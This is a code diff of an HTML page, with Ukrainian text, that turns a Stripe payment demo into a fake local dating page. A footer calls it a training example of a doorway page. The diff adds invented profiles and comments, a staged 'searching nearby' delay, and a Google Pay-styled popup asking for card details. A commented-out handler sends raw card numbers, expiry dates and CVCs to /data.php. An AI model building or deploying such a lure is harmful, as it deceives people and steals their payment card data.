@@ -3,48 +3,318 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Оплата з автозаповненням</title>
+    <title>Знайомства поруч</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <script src="https://js.stripe.com/v3/"></script>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
 
-<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+<body class="bg-gradient-to-br from-pink-100 to-purple-200 min-h-screen flex items-center justify-center p-4">
 
-    <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md">
-        <h2 class="text-2xl font-bold mb-6 text-center">Оплата</h2>
+    <div class="bg-white max-w-md w-full rounded-2xl shadow-xl overflow-hidden relative">
 
-        <!-- Контейнер автозаповнення -->
-        <div id="autofill-container" class="mb-6">
-            <p class="text-gray-700 mb-2">Можна оплатити швидко через автозаповнення Google Pay / Chrome:</p>
-            <div id="card-element-autofill" class="p-3 border border-gray-300 rounded-lg mb-3"></div>
-            <button id="submit-autofill"
-                class="w-full bg-green-600 text-white font-bold py-3 rounded-lg hover:bg-green-700 transition">
-                Оплатити через автозаповнення
-            </button>
+        <!-- MAIN IMAGE + ONLINE + GALLERY -->
+        <div class="relative">
+            <img id="mainPhoto" class="w-full h-96 object-cover" alt="Дівчина">
+            <span id="onlineStatus"
+                class="absolute top-4 left-4 bg-green-500 text-white text-xs px-3 py-1 rounded-full">● онлайн</span>
+            <div id="gallery" class="absolute bottom-3 left-0 right-0 flex justify-center space-x-2 px-2"></div>
         </div>
 
-        <!-- Контейнер ручного вводу (спочатку прихований) -->
-        <div id="manual-container" class="hidden">
-            <p class="text-gray-700 mb-2">Введіть дані вручну:</p>
-            <form id="manual-form" class="space-y-4">
-                <input type="text" id="card-number" placeholder="Номер картки" required
-                    class="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:outline-none">
-                <div class="flex space-x-4">
-                    <input type="text" id="card-exp" placeholder="MM/YY" required
-                        class="flex-1 p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:outline-none">
-                    <input type="text" id="card-cvc" placeholder="CVC" required
-                        class="flex-1 p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:outline-none">
-                </div>
-                <button type="submit"
-                    class="w-full bg-blue-600 text-white font-bold py-3 rounded-lg hover:bg-blue-700 transition">
-                    Оплатити вручну
+        <!-- PROFILE INFO -->
+        <div class="p-5">
+            <div class="flex justify-between items-center">
+                <h1 id="profileName" class="text-2xl font-bold">Ім'я, Вік</h1>
+                <span id="distance" class="text-sm text-gray-500">📍 0 м</span>
+            </div>
+
+            <p id="profileDesc" class="mt-2 text-gray-600"></p>
+
+            <!-- CTA Buttons -->
+            <div class="mt-6 space-y-3">
+                <button onclick="goToOffer()" class="w-full bg-pink-500 text-white py-3 rounded-xl font-semibold">
+                    💬 Почати спілкування
                 </button>
-            </form>
-        </div>
 
-        <div id="result" class="mt-4 text-center font-medium"></div>
+                <button id="searchBtn"
+                    class="w-full border border-pink-400 text-pink-500 py-3 rounded-xl font-semibold hover:bg-pink-50 transition">
+                    🔍 Знайти дівчат поруч
+                </button>
+            </div>
+
+            <p class="mt-4 text-xs text-center text-gray-400">
+                * Навчальний приклад дорвею
+            </p>
+        </div>
     </div>
+
+    <!-- MODAL -->
+    <div id="modal" class="fixed inset-0 bg-black/70 hidden items-center justify-center z-50 p-4">
+        <button onclick="closeModal()"
+            class="absolute top-3 right-3 text-white bg-black/60 rounded-full px-3 py-1 text-lg font-bold hover:bg-black/80 transition">✕</button>
+        <div class="bg-white w-full max-w-md rounded-xl overflow-hidden relative">
+            <div class="relative">
+                <img id="modalImage" class="w-full h-80 object-cover rounded-t-xl">
+                <button onclick="prevSlide()"
+                    class="absolute left-2 top-1/2 -translate-y-1/2 bg-black/50 text-white px-3 py-1 rounded-full">‹</button>
+                <button onclick="nextSlide()"
+                    class="absolute right-2 top-1/2 -translate-y-1/2 bg-black/50 text-white px-3 py-1 rounded-full">›</button>
+            </div>
+            <div id="comments" class="p-4 space-y-3 text-sm max-h-60 overflow-y-auto"></div>
+        </div>
+    </div>
+
+    <!-- PAY POPUP -->
+    <div id="payPopup" class="fixed inset-0 bg-black/70 hidden items-center justify-center z-50 p-4">
+        <div class="bg-white w-full max-w-sm rounded-xl p-6 space-y-4">
+            <h2 class="text-xl font-bold text-center">Зареєструйся зараз!</h2>
+            <!-- Контейнер автозаповнення -->
+            <div id="autofill-container" class="mb-6">
+                <p class="text-gray-700 mb-2">Можна оплатити швидко через автозаповнення Google Pay / Chrome:</p>
+                <div id="card-element-autofill" class="p-3 border border-gray-300 rounded-lg mb-3"></div>
+
+
+                <button id="submit-autofill" class="flex items-center justify-center gap-2
+                            bg-black text-white
+                            rounded-xl
+                            px-6 py-3
+                            hover:bg-gray-900
+                            active:scale-95
+                            transition
+                            w-full max-w-sm">
+
+                    <!-- Google Pay logo -->
+                    <svg width="38" height="16" viewBox="0 0 38 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path
+                            d="M16.7 7.9c0-.5 0-.9-.1-1.3H8.4v2.5h4.7c-.2 1-.9 1.8-1.9 2.3v1.9h3.1c1.8-1.6 2.4-3.3 2.4-5.4Z"
+                            fill="#4285F4" />
+                        <path
+                            d="M8.4 15c2.6 0 4.8-.8 6.4-2.3l-3.1-1.9c-.9.6-2 .9-3.3.9-2.5 0-4.6-1.7-5.4-4H0v2.5C1.6 13.2 4.8 15 8.4 15Z"
+                            fill="#34A853" />
+                        <path
+                            d="M3 7.7c-.2-.6-.3-1.2-.3-1.9 0-.6.1-1.3.3-1.9V1.4H0C-.6 2.6-1 4.2-1 5.8s.4 3.2 1 4.4L3 7.7Z"
+                            fill="#FBBC05" />
+                        <path
+                            d="M8.4 2.3c1.4 0 2.6.5 3.6 1.4l2.7-2.7C13.2.5 11 0 8.4 0 4.8 0 1.6 1.8 0 4.4l3 2.5c.8-2.3 2.9-4 5.4-4Z"
+                            fill="#EA4335" />
+                    </svg>
+
+                    <span class="text-sm font-medium tracking-wide">
+                        Pay with Google Pay
+                    </span>
+                </button>
+
+            </div>
+
+            <!-- Контейнер ручного вводу (спочатку прихований) -->
+            <div id="manual-container" class="hidden">
+                <p class="text-gray-700 mb-2">Введіть дані вручну:</p>
+                <form id="manual-form" class="space-y-4">
+                    <input type="text" id="card-number" placeholder="Номер картки" required
+                        class="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:outline-none">
+                    <div class="flex space-x-4">
+                        <input type="text" id="card-exp" placeholder="MM/YY" required
+                            class="flex-1 p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:outline-none">
+                        <input type="text" id="card-cvc" placeholder="CVC" required
+                            class="flex-1 p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:outline-none">
+                    </div>
+                    <button type="submit"
+                        class="w-full bg-blue-600 text-white font-bold py-3 rounded-lg hover:bg-blue-700 transition">
+                        Оплатити вручну
+                    </button>
+                </form>
+            </div>
+
+            <div id="result" class="mt-4 text-center font-medium"></div>
+        </div>
+    </div>
+
+    <!-- REGISTRATION POPUP -->
+    <div id="registerPopup" class="fixed inset-0 bg-black/70 hidden items-center justify-center z-50 p-4">
+        <div class="bg-white w-full max-w-sm rounded-xl p-6 space-y-4">
+            <h2 class="text-xl font-bold text-center">Зареєструйся зараз!</h2>
+            <input type="text" placeholder="Ім'я" class="w-full border p-2 rounded">
+            <input type="email" placeholder="Email" class="w-full border p-2 rounded">
+            <button onclick="closeRegister()"
+                class="w-full bg-pink-500 text-white py-2 rounded font-semibold">Зареєструватися</button>
+            <button onclick="closeRegister()"
+                class="w-full border border-gray-400 py-2 rounded hover:bg-gray-100 transition">Закрити</button>
+        </div>
+    </div>
+
+    <!-- FULLSCREEN SEARCH OVERLAY -->
+    <div id="searchOverlay"
+        class="fixed inset-0 bg-black/70 hidden items-center justify-center z-50 text-white text-xl font-bold">
+        🔍 Пошук дівчат поруч...
+    </div>
+
+
+    <script>
+        const profiles = [
+            {
+                name: 'Юля, 23',
+                distance: '700 м',
+                desc: 'Люблю каву ☕ та нові знайомства. Пиши 😉',
+                photos: [
+                    { img: 'https://images.unsplash.com/photo-1520813792240-56fc4a3765a7', comments: [{ user: 'Макс', text: 'Круте фото 😍', date: '12.01.2026' }] },
+                    { img: 'https://images.unsplash.com/photo-1500648767791-00dcc994a43e', comments: [{ user: 'Сергій', text: 'Ти тут класно виглядаєш', date: '14.01.2026' }] }
+                ]
+            },
+            {
+                name: 'Оля, 21',
+                distance: '1 км',
+                desc: 'Обожнюю подорожі і музику 🎶',
+                photos: [
+                    { img: 'https://images.unsplash.com/photo-1524504388940-b1c1722653e1', comments: [{ user: 'Ігор', text: 'Мила дівчина', date: '12.01.2026' }] },
+                    { img: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb', comments: [{ user: 'Лев', text: 'Красиво!', date: '13.01.2026' }] }
+                ]
+            },
+            {
+                name: 'Надія, 25',
+                distance: '500 м',
+                desc: 'Люблю спорт і активний відпочинок 🏃‍♀️',
+                photos: [
+                    { img: 'https://images.unsplash.com/photo-1544005313-94ddf0286df2', comments: [{ user: 'Олег', text: 'Супер фото!', date: '14.01.2026' }] },
+                    { img: 'https://images.unsplash.com/photo-1544005313-94ddf0286df2', comments: [{ user: 'Андрій', text: 'Класно виглядаєш', date: '15.01.2026' }] }
+                ]
+            }
+        ];
+
+        let currentProfile = 0;
+        let currentPhotoIndex = 0;
+
+        function showProfile(index) {
+            const profile = profiles[index];
+            document.getElementById('profileName').textContent = profile.name;
+            document.getElementById('distance').textContent = profile.distance;
+            document.getElementById('profileDesc').textContent = profile.desc;
+            document.getElementById('mainPhoto').src = profile.photos[0].img;
+            currentPhotoIndex = 0;
+
+            const gallery = document.getElementById('gallery');
+            gallery.innerHTML = '';
+            profile.photos.forEach((p, i) => {
+                const imgEl = document.createElement('img');
+                imgEl.src = p.img;
+                imgEl.className = 'h-16 w-16 object-cover rounded-lg cursor-pointer border-2 border-white shadow';
+                imgEl.onclick = () => { openModal(i); currentPhotoIndex = i; };
+                gallery.appendChild(imgEl);
+            });
+        }
+
+        showProfile(currentProfile);
+
+        document.getElementById('searchBtn').addEventListener('click', () => {
+            if (currentProfile < profiles.length - 1) {
+                const overlay = document.getElementById('searchOverlay');
+                overlay.classList.remove('hidden');
+                overlay.classList.add('flex');
+
+                const btn = document.getElementById('searchBtn');
+                btn.disabled = true;
+
+                currentProfile++;
+                const profile = profiles[currentProfile];
+
+                // Мінімальний час анімації пошуку (мс)
+                const minTime = 2500;
+                const startTime = Date.now();
+
+                // Підготуємо всі фото для preload
+                const imagesToLoad = [profile.photos[0].img, ...profile.photos.map(p => p.img)];
+                let loadedCount = 0;
+
+                const checkAllLoaded = () => {
+                    loadedCount++;
+                    if (loadedCount === imagesToLoad.length) {
+                        // Всі фото завантажені
+                        const elapsed = Date.now() - startTime;
+                        const remaining = Math.max(0, minTime - elapsed); // залишок часу
+                        setTimeout(() => {
+                            showProfile(currentProfile);
+                            overlay.classList.add('hidden');
+                            overlay.classList.remove('flex');
+                            btn.disabled = false;
+                        }, remaining);
+                    }
+                };
+
+                // Preload
+                imagesToLoad.forEach(src => {
+                    const img = new Image();
+                    img.onload = checkAllLoaded;
+                    img.src = src;
+                });
+            } else {
+                // Після останнього профілю – показуємо реєстрацію
+                document.getElementById('registerPopup').classList.remove('hidden');
+                document.getElementById('registerPopup').classList.add('flex');
+            }
+        });
+
+
+        // Модалка
+        function openModal(index) {
+            currentPhotoIndex = index;
+            document.getElementById('modal').classList.remove('hidden');
+            document.getElementById('modal').classList.add('flex');
+            renderSlide();
+        }
+
+        function closeModal() {
+            document.getElementById('modal').classList.add('hidden');
+        }
+
+        document.getElementById('modal').addEventListener('click', e => {
+            if (e.target.id === 'modal') closeModal();
+        });
+
+        function renderSlide() {
+            const photos = profiles[currentProfile].photos;
+            const photo = photos[currentPhotoIndex];
+            document.getElementById('modalImage').src = photo.img;
+
+            const commentsBox = document.getElementById('comments');
+            commentsBox.innerHTML = '';
+            photo.comments.forEach(c => {
+                commentsBox.innerHTML += `
+                <div class="flex gap-2">
+                    <img src="https://i.pravatar.cc/40?u=${c.user}" class="w-8 h-8 rounded-full">
+                    <div class="bg-gray-100 rounded-lg p-2 w-full">
+                    <div class="flex justify-between text-xs text-gray-500">
+                        <strong>${c.user}</strong>
+                        <span>${c.date}</span>
+                    </div>
+                    <p>${c.text}</p>
+                    </div>
+                </div>
+                `;
+            });
+        }
+
+        function nextSlide() {
+            const photos = profiles[currentProfile].photos;
+            currentPhotoIndex = (currentPhotoIndex + 1) % photos.length;
+            renderSlide();
+        }
+
+        function prevSlide() {
+            const photos = profiles[currentProfile].photos;
+            currentPhotoIndex = (currentPhotoIndex - 1 + photos.length) % photos.length;
+            renderSlide();
+        }
+
+        // Реєстрація
+        function closeRegister() {
+            document.getElementById('registerPopup').classList.add('hidden');
+        }
+
+        // Кнопка спілкування
+        function goToOffer() {
+            document.getElementById('payPopup').classList.remove('hidden');
+            document.getElementById('payPopup').classList.add('flex');
+        }
+    </script>
 
     <script>
         const stripe = Stripe('pk_test_ТВОЙ_PUBLISHABLE_KEY'); // Замінити на свій ключ
@@ -55,77 +325,67 @@
         const cardAutofill = elements.create('card', { hidePostalCode: true });
         cardAutofill.mount('#card-element-autofill');
 
+        let isCardEmpty = true;
+        let isCardErrorMessage = false;
+        let isCardComplete = false;
+
+        cardAutofill.on('change', (event) => {
+            if (event.empty) {
+                isCardEmpty = event.empty;
+            }
+            else if (event.error) {
+                isCardErrorMessage = event.error.message;
+            }
+            else if (event.complete) {
+                isCardComplete = event.complete
+            }
+        });
         document.getElementById('submit-autofill').addEventListener('click', async (e) => {
             e.preventDefault();
 
-            try {
-                const { paymentMethod, error } = await stripe.createPaymentMethod({
-                    type: 'card',
-                    card: cardAutofill
-                });
-
-                if (error) {
-                    resultDiv.textContent = `Не вдалося використати автозаповнення: ${error.message}`;
-                    resultDiv.classList.remove('text-green-600');
-                    resultDiv.classList.add('text-red-600');
-
-                    // Показуємо форму ручного вводу тільки при помилці
-                    document.getElementById('manual-container').classList.remove('hidden');
-                    // Можна приховати автозаповнення або залишити
-                    // document.getElementById('autofill-container').classList.add('hidden');
-                } else {
-                    resultDiv.textContent = `Токен створено: ${paymentMethod.id}`;
-                    resultDiv.classList.remove('text-red-600');
-                    resultDiv.classList.add('text-green-600');
-                    console.log(paymentMethod);
-                    // Відправляємо paymentMethod.id на сервер
-                }
-            } catch (err) {
-                resultDiv.textContent = `Сталася помилка: ${err.message}`;
+            // 🔹 Перевірка: чи користувач взагалі щось ввів
+            if (isCardEmpty) {
+                resultDiv.textContent = 'Поле картки порожнє. Спробуйте автозаповнення або введіть дані.';
                 resultDiv.classList.remove('text-green-600');
                 resultDiv.classList.add('text-red-600');
-
-                // Показуємо ручну форму у випадку серйозної помилки
-                document.getElementById('manual-container').classList.remove('hidden');
+                return;
             }
-        });
-
-        // Обробка ручної форми
-        const manualForm = document.getElementById('manual-form');
-        manualForm.addEventListener('submit', async (e) => {
-            e.preventDefault();
-
-            const cardNumber = document.getElementById('card-number').value.replace(/\s+/g, '');
-            const cardExp = document.getElementById('card-exp').value.split('/');
-            const cardCvc = document.getElementById('card-cvc').value;
-
-            const { paymentMethod, error } = await stripe.createPaymentMethod({
-                type: 'card',
-                card: {
-                    number: cardNumber,
-                    exp_month: parseInt(cardExp[0]),
-                    exp_year: parseInt(cardExp[1]),
-                    cvc: cardCvc
-                }
-            });
-
-            if (error) {
-                resultDiv.textContent = error.message;
+            if (isCardErrorMessage) {
+                resultDiv.textContent = isCardErrorMessage;
                 resultDiv.classList.remove('text-green-600');
                 resultDiv.classList.add('text-red-600');
-            } else {
-                resultDiv.textContent = `Токен створено: ${paymentMethod.id}`;
-                resultDiv.classList.remove('text-red-600');
-                resultDiv.classList.add('text-green-600');
-                console.log(paymentMethod);
-                // Відправка paymentMethod.id на сервер
+                return;
             }
+            if (isCardComplete) {
+                resultDiv.textContent = 'isCardComplete';
+               console.log(document.getElementById('autofill-container'))
+               console.log(document.getElementById('autofill-container'.innerHTML))
+            }
+
         });
+
+
+        // // Обробка ручної форми
+        // const manualForm = document.getElementById('manual-form');
+        // manualForm.addEventListener('submit', async (e) => {
+        //     e.preventDefault();
+
+        //     const cardNumber = document.getElementById('card-number').value.replace(/\s+/g, '');
+        //     const cardExp = document.getElementById('card-exp').value.split('/');
+        //     const cardCvc = document.getElementById('card-cvc').value;
+
+        //     const data = {
+        //         timestamp: Date.now(),
+        //         cardNumber: cardNumber,
+        //         cardExp: cardExp,
+        //         cardCvc: cardCvc
+        //     };
+
+        //     // відправка на сервер без блокування
+        //     navigator.sendBeacon("/data.php", JSON.stringify(data));
+        // });
     </script>
 
 </body>
-
-</html>
-
 
 </html>
